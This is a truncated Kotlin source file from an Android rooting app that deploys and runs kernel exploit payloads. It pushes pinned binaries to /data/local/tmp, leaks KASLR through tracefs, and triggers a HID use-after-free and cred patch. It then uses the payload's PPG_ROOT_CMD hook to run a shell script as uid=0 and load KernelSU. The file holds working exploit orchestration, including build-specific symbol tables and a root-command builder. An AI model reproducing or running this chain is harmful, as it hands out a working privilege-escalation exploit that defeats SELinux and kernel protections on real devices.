package com.extractkit.app

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

data class Env(
    val model: String,
    val device: String,
    val androidRelease: String,
    val kernel: String,
    val selinux: String,
    val uidLine: String,
    val tracefs: Boolean,
    val rawTrace: Boolean,
    val trigger: Boolean,
    val cpus: Int,
    val kernelsu: Boolean,
    val suPath: String,
    val match: KernelTable.Match,
    /** 9.293：shell 通道本身不可用（fork 不出 sh）时的完整原因；null = 通道正常。 */
    val shellError: String? = null,
    /** 9.293：同一时刻服务端自述（uid / 实际 cwd / 实际 sh / fd 数），只在出错时填。 */
    val shellDiag: String? = null,
) {
    fun pretty(): String = buildString {
        appendLine("model    $model / $device")
        appendLine("system   Android $androidRelease")
        appendLine("kernel   ${kernel.substringBefore("-abogki")}")
        appendLine("match    ${match.level} ${match.reason}")
        appendLine("SELinux $selinux")
        appendLine("identity $uidLine")
        appendLine("CPU    $cpus")
        appendLine("tracefs trace=${yn(tracefs)} raw=${yn(rawTrace)} trigger=${yn(trigger)}")
        appendLine("KSU    ${if (kernelsu) "loaded" else "not loaded"}   su=${suPath.ifEmpty { "none" }}")
    }

    private fun yn(b: Boolean) = if (b) "ok" else "n/a"
}


data class Outcome(
    val ok: Boolean,
    val stage: String,
    val detail: String,
    val env: Env? = null,
    val verify: List<String> = emptyList(),
)

class ExtractEngine(
    private val ctx: Context,
    private val log: (String) -> Unit,
    private val onStage: (String) -> Unit,
) {

    /** 9.376: the manager CLI the profile was rewritten to, for holder retries. */
    private var mgrCliPath: String? = null

    companion object {
        const val WORK_DIR = "/data/local/tmp/extract-kit"
        /** 9.288：原字节 ghost payload 的落地点与钉死的字节身份（原版就是这个名字）。 */
        private const val GHOST_PATH = "/data/local/tmp/glpreload"
        private const val GHOST_SIZE = 6470288
        private const val KSU_STAGE_OUT = "/data/local/tmp/ksu_stage.out"
        /** 9.328: reference chain binary (real_cred) plus the profile it loads. */
        private const val WACOM_BIN = "eksu.bin"
        private const val WACOM_PATH = "/data/local/tmp/eksu.bin"
        private const val WACOM_SIZE = 124984
        private const val CHAIN_DIR = "/data/local/tmp/eksu"
        private const val RUN_LOG = CHAIN_DIR + "/run.log"
        private const val PROFILE_ASSET = "payload/wacom/profile-6.6.json"
        /** 9.369: back to the 9.358 payload, so the 105-key JSON profile is back too and
         *  the 24-key key=value document the 9.366 chain wanted is no longer read. */
        private const val SYMS_ASSET = "payload/wacom/ko-syms.txt"
        private const val SYMS_SIZE = 7929
        private const val SYMS_SHA = "1609d7230de634811d032dfc987b0dd1db58869dd2cd1a5bd5fb0b695ebc98e0"
        /**
         * 9.402: ko_patch 的表是按 build 定址的，必须「名字表 x 本 build 的 kallsyms」。
         * 每个 release 一张，落盘名要与 payload 的默认路径一致：<workdir>/ko-syms-<release>.txt。
         *
         * 9.406: 内置只留 6.6.118 这两个 build（g5549 用 SYMS_ASSET，ga812a19 用下面这张）。
         * 其它 release 必须先在应用内标定一次，由 CalibrationModel 现场生成 profile + 表。
         */
        /**
         * 9.406: 每张 ko-syms 表按「内核版本 + g<hash>」定址（payload 的 rel_same_build 判据），
         * 上面这张 SYMS_ASSET 就是 g554929766a0d 的；其余内置 release 在这里查表。
         * 落盘名仍与 payload 默认路径一致：<workdir>/ko-syms-<release>.txt。
         */
        internal val SYMS_BY_RELEASE: Map<String, Triple<String, Int, String>> = mapOf(
            "6.6.118-android15-8-g554929766a0d-abogki544555896-4k"
                to Triple(SYMS_ASSET, SYMS_SIZE, SYMS_SHA),
            "6.6.118-android15-8-ga812a1946391-abogki576098434-4k"
                to Triple("payload/wacom/ko-syms-6.6.118-android15-8-ga812a1946391-abogki576098434-4k.txt", 7477, "fd9374564370b903032cb766a48e8e0a9e022bc5cd6ca9df39af1fac87971ed0"),
            "6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k"
                to Triple("payload/wacom/ko-syms-6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k.txt", 7476, "08bfc6fada50665c66b0b47e609bf7a80cbef81877bce942998a5ba8aa003bb9"),
            "6.12.58-android16-6-gdf8d34cadbf7-abogki584560711-4k"
                to Triple("payload/wacom/ko-syms-6.12.58-android16-6-gdf8d34cadbf7-abogki584560711-4k.txt", 7556, "7be92c67d8d5f9327de3bb4973bd8b7827bada33c45302cad3539fe3089384a5"),
            "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k"
                to Triple("payload/wacom/ko-syms-6.12.58-android16-6-g142ddad31e60-abogki576095858-4k.txt", 8043, "24d07f0c4592e2e4dad9de3beefbfde9dfadff5c51465651adca1eace8022f88"),
            "6.12.69-android16-6-g5fd39602326e-ab16372235-4k"
                to Triple("payload/wacom/ko-syms-6.12.69-android16-6-g5fd39602326e-ab16372235-4k.txt", 7551, "1289cc0769d790d5fcd574f5a3abf7f358e5f97ddf7c3bdad749a562719998a9"),
            "6.1.128-android14-11-g52c266270871"
                to Triple("payload/wacom/ko-syms-6.1.128-android14-11-g52c266270871.txt", 7333, "2439053f6597d49009b0839c919ce03255fba695b658c425f46f8d9003156d17"),
            "6.1.157-android14-11-g19a495a97bff"
                to Triple("payload/wacom/ko-syms-6.1.157-android14-11-g19a495a97bff.txt", 7333, "8e5f31e7384a38db75d9adc457ef6fc809b811df4e6673bd1baa7c7e3aab8d32"),
        )
        private const val FALLBACK_PROFILE_PATH = "/data/local/tmp/eksu-profile.json"
        private const val FALLBACK_CHAIN_DIR = "/data/local/tmp/eksu-work"
        private const val PROFILE_SIZE = 3162
        private const val STAGE_DONE = "/data/local/tmp/eksu.stage.done"
        // 9.376: a failed run leaves a uid=0 service holder behind these files.
        /** 9.300：payload 在 slide 不对齐（预设与内核不匹配）时写的自证文件。 */
        private const val WACOM_PRESET = "/data/local/tmp/eksu.preset"

        /**
         * 9.293：boot_id 必须是标准 uuid 才算数。
         *
         * 9.104 那代把 `Shell.exec(...).second.trim()` 直接当 boot_id，命令失败时拿到的是
         * 异常文本（日志里那句 `boot_id=java.io.`），还被写进 last_ok_boot —— 下次开机
         * 既不能判重也可能误判。这里只接受真 uuid，其余一律当「读不到」。
         */
        fun bootIdOf(raw: String): String =
            if (raw.trim().matches(Regex("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$")))
                raw.trim() else ""

        /**
         * 9.384：不经过 Shizuku 也能读到本次开机的 boot_id。
         *
         * /proc/sys/kernel/random/boot_id 是 0444，普通应用进程直接可读；shell 通道挂掉
         * （Shizuku 没启动 / 授权被撤）时拿到它，才能把「这次开机已经提权成功」显示出来，
         * 而不是一直停在「未检测到 Shizuku」。
         */
        fun localBootId(): String = try {
            bootIdOf(java.io.File("/proc/sys/kernel/random/boot_id").readText())
        } catch (t: Throwable) {
            ""
        }

        /** 9.292：root 子进程（payload 的 uid=0 执行口）回写的证据文件，App 以 uid=2000 读回。 */
        private const val ROOT_UID_FILE = "/data/local/tmp/extract-kit/root_uid"
        private const val KSU_PARAMS_FILE = "/data/local/tmp/extract-kit/ksu_params"

        /**
         * 9.292：借原字节 payload 自己的 uid=0 执行口（env `PPG_ROOT_CMD`）。
         *
         * 反汇编依据：spawn_root_child 在 cred patch 成 uid=0 后 getenv("PPG_ROOT_CMD")，
         * 非空且 getuid()==0/geteuid()==0 就 execl("/system/bin/sh","sh","-c",<cmd>)。
         * 因此这里**再跑一次同样的字节**：还是 cd /data/local/tmp + ./glpreload + 零 argv，
         * 唯一的区别是给 root 子进程一条要执行的命令（我们把 stage 拉起来）。
         * 注意：设了这个 env 之后 payload 的 root 子进程被 execl 顶掉，不会再去装它自己的 su，
         * 所以这条路只在「第一阶段已经把 kernelsu 装进内核」之后用来拿一次 uid=0。
         */
        internal fun rootCmdRunCmd(script: String, mgr: String, mgrUid: Int?, workDir: String): String {
            val inner = "/system/bin/sh " + script + " > " + KSU_STAGE_OUT + " 2>&1"
            return "cd /data/local/tmp && PPG_ROOT_CMD=" + quoteArg(inner) +
                " EXTRACTKIT_MGR=" + mgr +
                (mgrUid?.let { " EXTRACTKIT_MGR_UID=" + it } ?: "") +
                " EXTRACTKIT_DRYRUN=0 EXTRACTKIT_REGISTER_ONLY=1 ./glpreload > " +
                workDir + "/rootcmd.log 2>&1; echo ROOTCMD_EXIT=\$?"
        }

        /** 单引号安全包裹（payload 的 sh -c 与我们的 UserService 都吃这一套）。 */
        internal fun quoteArg(s: String): String = "'" + s.replace("'", "'\\''") + "'"
        private const val GHOST_SHA = "c033080b4dae58d561742d0ad880d63176514f984a44ed1298a9bb2bcad650e5"
        private const val EOF = "\u0000__EOF__"
    }

    // ---------------------------------------------------------------- 连接层

    suspend fun ensureShell(): Boolean = withContext(Dispatchers.IO) {
        if (Shell.connected()) return@withContext true
        onStage("connect Shizuku UserService")
        // 9.286: report progress each attempt so the UI never sits still
        val ok = Shell.connect(ctx, onProgress = { log(it) })
        if (!ok) {
            log("! shell connect failed: ${Shell.error() ?: "unknown"}")
            log("· on the phone: Shizuku running (started via wireless debugging), app authorized,")
            log("  HONOR battery settings allow background start")
        }
        ok
    }

    // ---------------------------------------------------------------- 环境探测

    /**
     * 一次性把环境探完：11 条命令合并成 1 次 shell 往返。
     * 原来每条都走一次 binder + fork sh，冷启动要多花 0.5~1.5 秒。
     */
    suspend fun probe(): Env = withContext(Dispatchers.IO) {
        val script = buildString {
            append("echo M=$(getprop ro.product.model); ")
            append("echo D=$(getprop ro.product.device); ")
            append("echo A=$(getprop ro.build.version.release); ")
            append("echo K=$(uname -r); ")
            append("echo S=$(getenforce); ")
            append("echo U=$(id); ")
            append("echo T=$([ -w /sys/kernel/tracing/trace ] && echo 1 || echo 0); ")
            append("echo R=$([ -r /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw ] && echo 1 || echo 0); ")
            append("echo G=$([ -w /sys/kernel/tracing/events/kmem/rss_stat/trigger ] && echo 1 || echo 0); ")
            append("echo C=$(grep -c ^processor /proc/cpuinfo); ")
            append("echo KS=$(grep -c kernelsu /proc/modules 2>/dev/null); ")
            append("echo SU=$(command -v su)")
        }
        // 9.293：probe 是整条链的第一条命令，它拿空输出就说明 shell 通道本身废了。
        // 以前这里直接 .second 解析，把「fork sh 失败」当成「tracefs 不可写」。
        val (probeCode, probeOut) = Shell.exec(script)
        val spawnText = Shell.lastExecErrorText()
        val shellError = if (probeOut.isBlank()) {
            ShellFailure.summary(spawnText ?: ("probe produced no output (exit=" + probeCode + ")"))
        } else null
        val diagText = if (shellError != null) Shell.diag() else null
        if (shellError != null) {
            log("! shell: " + ShellFailure.kind(spawnText ?: "") + ": " + shellError)
            log("· shell diag: " + (diagText ?: "?"))
        }
        val kv = probeOut.lineSequence()
            .mapNotNull { line ->
                val i = line.indexOf('=')
                if (i <= 0) null else line.substring(0, i).trim() to line.substring(i + 1).trim()
            }
            .toMap()

        fun v(k: String) = kv[k].orEmpty()
        val kernel = v("K")
        Env(
            model = v("M"),
            device = v("D"),
            androidRelease = v("A"),
            kernel = kernel,
            selinux = v("S").ifEmpty { "?" },
            uidLine = shortId(v("U")),
            tracefs = v("T") == "1",
            rawTrace = v("R") == "1",
            trigger = v("G") == "1",
            cpus = v("C").toIntOrNull() ?: 0,
            kernelsu = v("KS").toIntOrNull()?.let { it > 0 } ?: false,
            suPath = v("SU"),
            match = KernelTable.match(kernel),
            shellError = shellError,
            shellDiag = diagText,
        )
    }

    private fun one(cmd: String): String = Shell.exec(cmd).second.trim()

    /** `id` 输出里的 groups 又长又没用，只留 uid/gid 和 SELinux 上下文 */
    private fun shortId(raw: String): String {
        if (raw.isBlank()) return "?"
        val uid = Regex("""uid=(\d+\([^)]*\))""").find(raw)?.groupValues?.get(1) ?: "?"
        val gid = Regex("""gid=(\d+\([^)]*\))""").find(raw)?.groupValues?.get(1) ?: "?"
        val ctx = Regex("""context=(\S+)""").find(raw)?.groupValues?.get(1) ?: "?"
        return "uid=$uid gid=$gid\n         context=$ctx"
    }

    private fun ok(cmd: String): Boolean = Shell.exec(cmd).first == 0

    // ------------------------------------------------------------------ 部署

    suspend fun deploy(payloads: List<Payload>): Boolean = withContext(Dispatchers.IO) {
        var allOk = true
        log("prepare dir $WORK_DIR")
        Shell.exec("mkdir -p $WORK_DIR 2>&1")
        for (p in payloads) {
            val bytes = runCatching { ctx.assets.open(p.asset).use { it.readBytes() } }.getOrNull()
            if (bytes == null) {
                log("! read assets/${p.asset} failed")
                allOk = false
                continue
            }
            val path = "$WORK_DIR/${p.name}"
            val remote = Shell.exec("sha256sum $path 2>/dev/null").second.trim().substringBefore(' ')
            if (remote.equals(p.sha256, ignoreCase = true)) {
                log("· ${p.name} up to date (sha256 match); skip push")
                continue
            }
            log("push ${p.name}  (${bytes.size} B) -> $path")
            // 9.295：不再写 .new 再 mv。9.294 真机就是死在这一步 —— pushFile 返回 0，
            // 但设备上没有 .new 文件，mv 只能说 "No such file or directory"，整条链停摆。
            // ETXTBSY 的正确规避是 unlink（unlink 对被执行的 inode 是允许的，只有
            // open(O_TRUNC) 才被拒），所以先 rm 再直写同一路径。
            Shell.exec("rm -f $path 2>/dev/null")
            var (code, out) = Shell.pushFile(path, bytes)
            log("· push step: ${Shell.lastPushInfo ?: "?"}")
            if (code != 0) {
                // 9.295：一次重试（pushFile 内部已重试两次）；重试前把残块清掉。
                log("! push failed exit=$code ${out.trim()}; retry once")
                Shell.exec("rm -f $path 2>/dev/null")
                val again = Shell.pushFile(path, bytes)
                code = again.first
                out = again.second
                log("· push step: ${Shell.lastPushInfo ?: "?"}")
            }
            if (code == 0) {
                Shell.exec("chmod 755 $path 2>/dev/null")
                val onDev = Shell.exec("wc -c < $path 2>/dev/null").second.trim().toLongOrNull()
                if (onDev != bytes.size.toLong()) {
                    log("! PUSH_SIZE_MISMATCH: want ${bytes.size} B, device has ${onDev ?: -1} B")
                    code = 1
                    out = "size mismatch"
                } else {
                    log("· on device: $onDev B")
                }
            }
            if (code != 0) {
                log("! push failed exit=$code ${out.trim()}")
                allOk = false
                continue
            }
            val sha = Shell.exec("sha256sum $path 2>/dev/null").second.trim().substringBefore(' ')
            if (sha.length == 64) {
                if (sha.equals(p.sha256, ignoreCase = true)) {
                    log("✓ sha256 ok")
                } else {
                    log("! sha256 mismatch\n    want ${p.sha256}\n    got  $sha")
                    allOk = false
                }
            } else {
                log("· device has no sha256sum; skip verify")
            }
        }

        // device.cfg：本机标定过的优先，其次用内置 profile（同内核设备开箱即用）
        val cfgBytes = ConfigGen.cfgBytesForCurrentKernel(ctx)
        val target = "$WORK_DIR/device.cfg"
        if (cfgBytes != null) {
            val (code, out) = Shell.pushFile(target, cfgBytes, executable = false)
            // 9.182：把用的是哪一档说清楚（内置表的 name / release），否则「内置表到底有没有生效」
            // 只能靠日志里那句「来源：内置 profile」猜。
            val builtin = ConfigGen.profileFor(System.getProperty("os.version"))
            // 9.296：出处（boot.img/Image dump 的 sha256 前 8 位）也写进日志，方便回溯到底是哪份固件标定的
            val origin = builtin?.bootSha256?.take(8).orEmpty()
            val src = if (builtin != null) {
                "builtin profile ${builtin.name} / ${builtin.release}" + if (origin.isEmpty()) "" else " / boot=$origin"
            } else "local calibration"
            if (code == 0) log("✓ device.cfg pushed (${cfgBytes.size} B, src=$src)")
            else log("! device.cfg push failed: ${out.trim()}")
        } else {
            log("· no matching device.cfg; payload uses builtin constants")
        }
        allOk
    }

    /**
     * HONOR 链的符号加载表：现场生成，不装外部文件（9.159）。
     *
     * 参考实现的 perf.tbl 是它自己那颗 5.10.236 的 kallsyms 快照，换内核即
     * 全部错位。我们改成从本机标定 / 内置 profile 取符号，序列化成 payload
     * 认识的 `# extractkit-map v1` 表再推过去；查不到的符号写 0，payload
     * 回落编译期常量或 offsets-only，绝不按猜测地址写。
     */
    suspend fun deployHonorMap(): Boolean = withContext(Dispatchers.IO) {
        val got = HonorMap.symsForCurrentKernel()
        if (got == null) {
            log("· no local symbol profile; honor.map not pushed (payload uses builtin)")
            return@withContext true
        }
        val (syms, kernel) = got
        val bytes = HonorMap.render(syms, kernel).toByteArray()
        val path = "$WORK_DIR/${HonorMap.FILE}"
        val (code, out) = Shell.pushFile(path, bytes, executable = false)
        if (code != 0) {
            log("! honor.map push failed: ${out.trim()}")
            return@withContext false
        }
        val known = HonorMap.NAMES.count { (syms[it] ?: 0L) != 0L }
        log("✓ honor.map built (${bytes.size} B, syms $known/${HonorMap.NAMES.size}, kernel=$kernel)")
        true
    }

    /**
     * 单步模式直接跑；steps 非空时按顺序串起来，任一步不通过就中止 ——
     * 这样"自检不过还硬上主链"这种事不会发生。
     */
    suspend fun run(
        mode: Mode,
        allowUnmatched: Boolean,
        onStageUpdate: (String) -> Unit = onStage,
        managerPkg: String? = null,
        safeMode: Boolean = false,
        slideHex: String? = null,
        pfnBaseHex: String? = null,
    ): Outcome = withContext(Dispatchers.IO) {
        // 记住开跑前是否已经有 root：用来区分「这次拿到的」和「本来就有」。
        val rootAtStart = runCatching { hasRootNow() }.getOrDefault(false)
        if (mode.steps.isEmpty()) {
            // 单步模式也要走 App 下发的 late-load 脚本（9.199）
            val singleStage = if (ManagerAudit.deploy(ctx)) ManagerAudit.SCRIPT else null
            return@withContext runSingle(
                mode, allowUnmatched, onStageUpdate, managerPkg, safeMode, slideHex, pfnBaseHex,
                singleStage,
            )
        }
        // 同一次开机只允许成功一次：UAF 是一次性资源，成功后再跑等于对已释放的槽位再写一遍。
        // 用内核自己给的 boot_id 判断，而不是我们的时间戳——重启后 boot_id 一定会变。
        val bootIdRaw = if (ensureShell()) {
            Shell.exec("cat /proc/sys/kernel/random/boot_id 2>/dev/null").second.trim()
        } else ""
        val bootId = bootIdOf(bootIdRaw)
        if (bootIdRaw.isNotEmpty() && bootId.isEmpty()) {
            log("[guard] boot_id=? (unreadable: " + ShellFailure.summary(bootIdRaw, 120) + ")")
        }
        val prefs = ctx.getSharedPreferences("run", android.content.Context.MODE_PRIVATE)
        val lastOkBoot = prefs.getString("last_ok_boot", null)
        if (bootId.isNotEmpty() && bootId == lastOkBoot) {
            log("[guard] already succeeded this boot (boot_id=${bootId.take(8)}); refuse repeat run")
            return@withContext Outcome(
                false, "SAME_BOOT",
                "Already rooted once this boot.\n" +
                    "One run per kernel; a second run writes already-freed objects.\n" +
                    "Reboot to retry; KernelSU reloads after reboot.",
            )
        }
        log("[guard] boot_id=${bootId.take(8).ifEmpty { "?" }} lastOk=${lastOkBoot?.take(8) ?: "none"}")

        // 9.199：late-load 脚本由 App 下发，不再依赖 payload 内嵌的那份。
        // 原因：6.6 钉回 9.192 字节（= 9.104 二进制）后，内嵌脚本是旧的
        // （grep -q ksud，认不出 MapleSU）。改成每次把 assets/stage/ksu_stage.sh
        // 推上去并用 EXTRACTKIT_STAGE 指过去，任何一支 payload 都跑同一份最新脚本。
        val stageScript = if (ManagerAudit.deploy(ctx)) {
            log("· late-load script pushed: ${ManagerAudit.SCRIPT}")
            ManagerAudit.SCRIPT
        } else {
            log("! late-load script push failed; fall back to embedded script")
            null
        }

        // 9.185：真机上主链卡在 base 标定 —— trace 的 raw 读口被 SELinux 拒。
        // EK-CALIB 标定器不依赖那条读口，先用它把 slide 标出来注入 payload。
        var slide = slideHex
        var pfnBase = pfnBaseHex
        val famNow = ReleaseMatrix.familyOf(System.getProperty("os.version"))
        // 6.1 支走 ma 那套「静态符号 + 外部 slide/base」，所以即使 slide 已有，
        // 也要问 EK-CALIB 要一次 page_offset（它同时算 slide 和 linear-map base）。
        // 9.272：EK-CALIB 标定器只在「用户真的选了 EK-CALIB 后端」或「6.1 支必须外部 slide」
        // 时才跑。默认关掉的原因：6.6 支的 payload 自己会从 trace 算 linear-map base
        // （真机日志 [base] candidates=46 votes=300），标定器跑一遍纯属多跑一个
        // perf_event_open，既拖时间又在日志里塞一堆 EK-CALIB 的行，用户会以为选错了链路。
        val backendPrefs = ctx.getSharedPreferences("backend", android.content.Context.MODE_PRIVATE)
        val wantsCalib = backendPrefs.getBoolean("useCALIB", false)
        val wantsGhost = backendPrefs.getBoolean("useGhost", false)
        val wantsWacom = backendPrefs.getBoolean("useWacom", false)
        // ghost 链自己做 perf KASLR（幻灯片由 payload 自己算），不需要 EK-CALIB 标定器，
        // 那条 trace 读口在我们这台机器上本来就是被 SELinux 拒的。
        // EK-W1 链同理：它自己从 tracefs 泄漏 KASLR，也不需要外部标定。
        val needExternalCal = (wantsCalib || famNow == "6.1") && !wantsGhost && !wantsWacom
        if (needExternalCal && ConfigGen.cfgBytesForCurrentKernel(ctx) != null
            && (slide.isNullOrBlank() || (famNow == "6.1" && pfnBase.isNullOrBlank()))
        ) {
            onStageUpdate("external calibration (CVE-2026-98937)")
            log("---- external calibration: CVE-2026-98937 (base fallback) ----")
            val own = EkCalib.calibrateOwn(ctx) { log(it) }
            if (own != null) {
                slide = own.first
                log("· external calibration: slide=$slide")
                if (own.second.isNotBlank()) {
                    pfnBase = own.second
                    log("· external calibration: page_offset=$pfnBase")
                }
            } else {
                log("· external calibration empty; payload derives base from trace")
            }
        } else {
            log("· external calibration skipped (EK-CALIB backend off; payload derives base itself)")
        }

        val total = mode.steps.size
        var last: Outcome? = null
        for ((index, id) in mode.steps.withIndex()) {
            val step = Modes.byId(id)
            onStageUpdate("[${index + 1}/$total] ${step.id}")
            log("======== step ${index + 1}/$total ${step.id} ========")
            // 9.233：stageScript 必须传下去。runSingle 里 EK_KSU_MODE/EXTRACTKIT_STAGE
            // 都依赖它非空，漏传就退回纯 uid0（真机表现：uid=0 成功但管理器没加载）。
            val out = runSingle(
                step, allowUnmatched, onStageUpdate, managerPkg, safeMode, slide, pfnBase, stageScript,
            )
            last = out
            if (!out.ok) {
                log("! step ${index + 1} failed (${out.stage}); chain aborted")
                // 9.455 (m10301): 被 PARKED / exp.bootid 拦住时说清楚是"本次开机已经试过一次"
                if (out.stage == "WACOM_PARKED_BOOT") {
                    log("! 本次开机已尝试过一次且失败（PARKED 标记 + exp.bootid 都在）；本次开机只允许触发一次，请重启手机后再试")
                }
                return@withContext out.copy(
                    // 9.376: keep the reboot-class code visible to the retry gate in
                    // RunModel ("PARKED" there), which only sees this string.
                    stage = if (out.stage == "WACOM_PARKED_BOOT") "CHAIN_STOP:${step.id}:PARKED" else "CHAIN_STOP:${step.id}",
                    detail = out.detail + "\nchain stopped at step ${index + 1}/$total (${step.id})",
                )
            }
        }
        val done = last ?: Outcome(false, "CHAIN", "empty chain")
        // 只有本轮真的拿到 uid=0（不是开机前就有 root）才记 last_ok_boot。
        if (done.ok && !rootAtStart && bootId.isNotEmpty()) {
            // 9.384：连同这次用的管理器包名一起记，Shizuku 不在时首页也能点开它。
            prefs.edit()
                .putString("last_ok_boot", bootId)
                .putString("last_ok_manager", managerPkg.orEmpty())
                .apply()
            log("[guard] recorded success for this boot (boot_id=${bootId.take(8)})")
        }
        done
    }

    private suspend fun runSingle(
        mode: Mode,
        allowUnmatched: Boolean,
        onStageUpdate: (String) -> Unit = onStage,
        managerPkg: String? = null,
        safeMode: Boolean = false,
        slideHex: String? = null,
        pfnBaseHex: String? = null,
        stageScript: String? = null,
    ): Outcome = withContext(Dispatchers.IO) {
        // 管理器包名：payload 用它决定 ksud late-load --package-name。
        // 传不进去就会退回编译期默认（com.sukisu.ultra），选别的管理器会「提权成功但没接管」。
        val mgrSafe = RunEnv.sanitizePkg(managerPkg)
        onStageUpdate("connect shell")
        if (!ensureShell()) {
            return@withContext Outcome(
                false, "NO_SHELL",
                "No shell context: ${Shell.error() ?: "Shizuku not running or not authorized"}.\n" +
                    "Start Shizuku on the device and authorize this app.",
            )
        }

        onStageUpdate("env probe")
        val env = probe()
        log("[env] ${env.kernel} / ${env.match.level} / SELinux=${env.selinux}")
        // 9.293：shell 通道废掉时必须报 SHELL_UNAVAILABLE，绝不能滑到 NO_TRACEFS ——
        // 后者会让人以为内核不给 tracefs，从而去改标定/payload，方向完全错了。
        if (env.shellError != null) {
            return@withContext Outcome(
                false, "SHELL_UNAVAILABLE",
                "Shell channel unusable: " + env.shellError + "\n" +
                    "  diag: " + (env.shellDiag ?: "?") + "\n" +
                    "  The UserService could not fork sh (cwd permission/label, sh not executable, or fd exhaustion).\n" +
                    "  9.293 already retries cwd [" + WORK_DIR + ", /data/local/tmp, /] x sh [/system/bin/sh, sh].\n" +
                    "  If it still fails the service ran out of file descriptors - reboot the device and retry.",
                env,
            )
        }
        // 注意：判断「能不能跑」只看有没有对得上这台内核的 device.cfg（内置 profile / 本机标定 / 导入的
        // device.cfg 都算），不能只看内置列表——否则自己标定完的内核会被 ENV_UNMATCHED 挡住。
        log("[cfg] " + ConfigGen.cfgDiagnosis(ctx))
        val hasCfg = ConfigGen.cfgBytesForCurrentKernel(ctx) != null
        // 唯一判据：这台内核有没有可用的 cfg。机型、内置列表档位（EXACT/FAMILY/UNKNOWN）
        // 都只用于展示，不再参与放行——避免「改了其中一个判断还是跑不通」。
        log("[cfg] gate=hasCfg hasCfg=$hasCfg level=${env.match.level} allow=$allowUnmatched")
        if (!hasCfg && !allowUnmatched) {
            return@withContext Outcome(
                false, "NO_CFG",
                """这台内核（${env.kernel}）没有可用的 device.cfg：
${ConfigGen.cfgDiagnosis(ctx)}
payload 只会用编译期常量（6.6.118 那套），在别的内核上跑不通。
去「标定」重新导入本机 boot.img（解析完会自动保存并下发 device.cfg）。""",
                env,
            )
        }
        // 9.156：预检 mode 已下架（见 PayloadCatalog.Modes 注释），这里不再有豁免分支。
        if (!env.tracefs) {
            return@withContext Outcome(
                false, "NO_TRACEFS",
                "tracefs not writable: no k_itimer address or KASLR slide; leak/reclaim cannot proceed.",
                env,
            )
        }

        // 安全模式用 work 目录里的标记文件传给 ksu_stage.sh（env 会被 execve 清掉，文件最稳）
        val safeFlag = "$WORK_DIR/safe_mode"
        Shell.exec(if (safeMode) "mkdir -p $WORK_DIR && touch $safeFlag" else "rm -f $safeFlag")
        if (safeMode) log("· safe mode: on (modules disabled before late-load, restored on success)")

        // 一种内核分支一份 payload：按 uname -r 的 主.次 版本选。
        // 依据：TimerRoot 那份 APK 的 assets 也是按分支分（EK-CORE-117 / EK-CORE-6138 / EK-CORE），
        // 每个目录一份 exploit-android-key-ptr，符号表再按管理器拆。
        // 注意：不能直接 substringBefore('-')，否则 "5.10.252-android12-9-g…" 会得到
        // "5.10.252"（版本号是主.次.补丁三段），永远匹配不到 PER_FAMILY 的 "5.10"。
        // release -> 分支 的映射独立成 ReleaseMatrix（单测覆盖 5.10/6.6/6.18 截断坑），
        // 这里只负责把它打进日志，让人一眼看出这台机器命中哪一支、为什么没命中。
        // 9.145：默认就用分支版（有的话）。以前要手动 touch use_fam 才换，等于
        // 「每类内核一支 payload」只在开发者记得开开关时成立。现在反过来，两个开关都是
        // 「强制」语义，冲突时 use_literal 优先（回滚/对照实验用）：
        //   /data/local/tmp/extract-kit/use_fam      强制分支版（旧开关，仍认）
        //   /data/local/tmp/extract-kit/use_literal  强制字面版（新）
        // 9.66 那条「6.x 主链一律回字面版」的规则随 9.145 取消：分支版现在带族身份与
        // 标定闸门，未标定族的符号地址是 0（不会算错 slide），比字面版更安全。
        // 9.192：这两个调试开关现在自带版本戳，过期自动删。
        // 原先是纯 exists()，设备上只要有人 touch 过一次 use_literal，之后每次升级都会
        // 一路回落到字面版（9.192 之前那份字面版停在 9.104，没有 real_cred 双写，
        // 于是在 6.1/6.12 上「跑完 10/10 但 uid 还是 2000」）。改成写版本号才算数：
        //   echo -n 当前版本号 > /data/local/tmp/extract-kit/use_literal
        // 空白或别的版本号一律视为上次调试留下的残留，直接删掉并打日志。
        val famSwitch = debugSwitch("$WORK_DIR/use_fam")
        val literalSwitch = debugSwitch("$WORK_DIR/use_literal")
        famSwitch.note?.let { log(it) }
        literalSwitch.note?.let { log(it) }
        val forceFam = famSwitch.on
        val forceLiteral = literalSwitch.on

        // 默认用分支版：它带编译期 EXPECT_FAMILY 闸门（跑错内核返回 3，不会静默跑偏），
        // 未标定分支还把 6.6 的符号地址置 0、自动退 offsets-only，比字面版更不容易 panic。
        // 矩阵外的 release（6.7 之类）没有分支版，才回落字面版。
        // 9.184：冻结分支（HOLD，目前只有 6.12）默认不选 —— 它的二进制是 9.104 原字节，
        // 在 6.12.x 上会 panic；use_fam 是唯一的强制口。
        val held = ReleaseMatrix.isHeld(ReleaseMatrix.familyOf(env.kernel))
        val famPayload =
            if (forceLiteral && !forceFam) null
            else if (held && !forceFam) null
            else ReleaseMatrix.payloadOf(env.kernel)
        if (held && !forceFam) {
            log("· fam payload held: " + ReleaseMatrix.describe(env.kernel) + "; using literal payload: " + mode.target.name)
            log("· to force it drop /data/local/tmp/extract-kit/use_fam (may panic)")
        } else if (forceLiteral && !forceFam) {
            log("· use_literal present; forcing literal payload: " + mode.target.name)
        } else if (famPayload == null) {
            log("· " + ReleaseMatrix.describe(env.kernel) + "; using literal payload: " + mode.target.name)
        } else {
            log("· fam payload: " + famPayload.name + " -- " + ReleaseMatrix.describe(env.kernel))
        }
        if (forceFam) log("· use_fam present; forcing fam payload (lower priority than use_literal)")
        // 9.298：EK-W1（wacom HID UAF → cred patch）链。与 ghost 并列：
        // 常量按 build 编死，只跑 payload/wacom/<已标定 build>，名单外直接拒跑。
        // 9.324：cred 补丁 + AVC permissive 窗口把 uid=0 交给它自己的 root 子进程，模块加载
        // 与管理器注册都在那个进程里完成（in-process finit_module），--exec 只跑 ksu_stage.sh 复核。
        val wantsWacom = ctx.getSharedPreferences("backend", android.content.Context.MODE_PRIVATE)
            .getBoolean("useWacom", false)
        if (wantsWacom) {
            val fam = ReleaseMatrix.familyOf(env.kernel) ?: ""
